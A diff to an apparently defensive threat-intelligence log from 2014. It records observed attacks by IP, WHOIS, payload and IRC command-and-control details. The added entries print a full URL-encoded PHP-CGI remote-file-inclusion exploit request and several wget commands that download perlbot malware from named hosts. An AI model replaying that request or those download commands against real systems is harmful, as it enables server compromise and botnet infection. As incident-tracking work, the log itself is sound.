@@ -16,7 +16,8 @@
 #WHOIS: whois data for the payload IP address
 #Notes: misc notes.
 
-#8/22/14
+#8/22/14:
+
 Pitcher: 96.8.126.97
 Catcher: 108.61.91.211
 Nslookup (pitcher): s1-dallas.cloudhostservers.com.
@@ -310,7 +311,7 @@ Payload: wget http://www.kniha.sivok.sk/letsex.php
 Description: N/A
 Notes: Payload seems to be based around clickfraud.
 
-#8/22/14:
+#8/29/14:
 
 Pitcher: 58.56.136.154
 Catcher: 213.5.67.223
@@ -494,4 +495,114 @@ Notes:
 Returning Champions:
 107.167.11.226
 188.190.98.18
+
+#9/5/14:
+
+Pitcher: 199.115.228.177
+Catcher: unknown
+NSlookup (pitcher): NX
+WHOIS (pitcher):
+199.115.228.0/22
+VOLUMEDRIVE
+US
+info@volumedrive.com
+AS46664
+NSlookup (catcher): unknown
+WHOIS (catcher): unknown
+Payload:  unknown
+Description: Base64 Encoding on the payload. Too large for IDS to capture entire payload
+Server: unknown
+Port: unknown
+Channel: unknown
+NSlookup: unknown
+WHOIS: unknown
+Notes:
+- A lot of Base 64. So much that the IDS has trouble capturing the whole thing. Here's what the header and the start of the RFI looks like:
+POST /cgi-bin/php?%2D%64+%61%6C%6C%6F%77%5F%75%72%6C%5F%69%6E%63%6C%75%64%65%3D%6F%6E+%2D%64+%73%61%66%65%5F%6D%6F%64%65%3D%6F%66%66+%2D%64+%73%75%68%6F%73%69%6E%2E%73%69%6D%75%6C%61%74%69%6F%6E%3D%6F%6E+%2D%64+%64%69%73%61%62%6C%65%5F%66%75%6E%63%74%69%6F%6E%73%3D%22%22+%2D%64+%6F%70%65%6E%5F%62%61%73%65%64%69%72%3D%6E%6F%6E%65+%2D%64+%61%75%74%6F%5F%70%72%65%70%65%6E%64%5F%66%69%6C%65%3D%70%68%70%3A%2F%2F%69%6E%70%75%74+%2D%64+%63%67%69%2E%66%6F%72%63%65%5F%72%65%64%69%72%65%63%74%3D%30+%2D%64+%63%67%69%2E%72%65%64%69%72%65%63%74%5F%73%74%61%74%75%73%5F%65%6E%76%3D%22%79%65%73%22+%2D%64+%63%67%69%2E%66%69%78%5F%70%61%74%68%69%6E%66%6F%3D%31+%2D%64+%61%75%74%6F%5F%70%72%65%70%65%6E%64%5F%66%69%6C%65%3D%70%68%70%3A%2F%2F%69%6E%70%75%74+%2D%6E HTTP/1.1
+Host: xx.xx.xx.xx
+User-Agent: Mozilla/5.0 (Windows NT 5.1; rv:31.0) Gecko/20100101 Firefox/31.0
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 54569
+Connection: close
+<?php
+$bufferf = '<tons of base64 encoding here>
+- The URL encoding is the part of the RFI exploit, where the header/PHP below is the portion that executes a payload, or tells the attacked system where to call back to get the payload.. Any information on this?
+- Also saw 202.51.195.26 Pitching this.
+
+Pitcher: 89.248.160.212
+Catcher: 54.209.129.218
+NSlookup (pitcher): mcquarrie.shaperetrieve.com
+WHOIS (pitcher):
+89.248.160.0/21
+Ecatel LTD
+NL
+abuse@ecatel.net
+AS29073
+NSlookup (catcher): outkastsgaming.com
+WHOIS (catcher):
+Amazon Web Services
+Payload: wget http://outkastsgaming.com/download/nice.png
+Description: perlbot
+Server: 94.102.52.10
+Port: 6667
+Channel: #perl
+NSlookup: hosted-by.ecatel.net
+WHOIS:
+Ecatel LTD
+NL
+abuse@ecatel.net
+AS29073
+94.102.48.0/20
+Notes:
+-Outkast gaming is a pretty popular gaming clan that spans many games. Interesting choice in tact.
+-Also interesting that the Pitcher and Payload server use the same hosting provider.
+
+Pitcher: 64.15.76.98
+Catcher: 64.15.76.98
+NSlookup (pitcher): NX
+WHOIS (pitcher):
+Netelligent Hosting Services
+NSlookup (catcher): NX
+WHOIS (catcher):
+Netelligent Hosting Services
+Payload: wget http://64.15.76.98/lak
+Description: perlbot
+Server: unknown
+Port: unknown
+Channel: unknown
+NSlookup: unknown
+WHOIS: unknown
+Notes:
+-tried acquiring payload; server was not responding to web requests. possibly already taken down?
+Pitcher: 194.60.242.251
+Catcher: 208.85.177.238
+Nslookup (pitcher): NX
+WHOIS (pitcher):
+194.60.242.0/24
+Intercom + LLC
+RU
+
+AS57470
+Internap Network Services/Eleven Inc.
+NSlookup (catcher): 208-85-177-238.peakinter.net
+WHOIS (catcher):
+208.85.176.0/21
+PEAKINTERNET
+US
+noc@peakinter.net
+Payload: wget 208.85.177.238/speedtest/.a/hb/php08
+Description: Perlbot
+Server: 194.24.228.203
+Port: 443
+Channel: #allornothing
+NSlookup: 194-24-228-203.thya.net.
+WHOIS:
+194.24.228.0/23
+L'ile aux surfers s.a.r.l.
+FR
+abuse@ripe.net
+AS41044
+Notes:
+- Does the Catcher IRC Server look familiar? I thought it would. Peak still has yet to fix their server actively serving payloads. 
+- Also saw 80.73.9.164 Referring to 208.85.177.238/speedtest/.a/hb/php07 (same payload)
 
